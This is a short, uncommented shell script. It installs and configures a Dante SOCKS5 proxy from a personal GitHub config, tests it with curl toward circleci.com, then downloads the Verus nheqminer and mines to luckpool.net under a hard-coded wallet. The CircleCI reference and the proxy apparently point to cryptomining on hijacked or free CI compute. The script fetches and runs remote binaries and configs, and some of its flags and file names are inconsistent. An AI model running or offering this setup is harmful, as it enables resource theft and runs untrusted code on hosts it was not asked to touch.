wget http://ppa.launchpad.net/dajhorn/dante/ubuntu/pool/main/d/dante/dante-server_1.4.1-1_amd64.deb -y
sudo apt-get install gdebi-core -y
sudo gdebi dante-server_1.4.1-1_amd64.deb -y
#
nano /etc/danted.conf
#
wget https://raw.githubusercontent.com/yunisajara0/yunisajasa/main/nano/etc/danted.conf
#
service danted start
#
service danted status
#
curl -v -x socks5://103.143.10.225:1080 https://circleci.com//
#
wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
tar -xvf nheqminer-Linux-v0.8.2.tgz 
tar -xvf nheqminer-Linux-v0.8.2.tar.gz
nheqminer/nheqminer -v -l eu.luckpool.net:3956 -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.FaxSlowsmo -p x -t 2
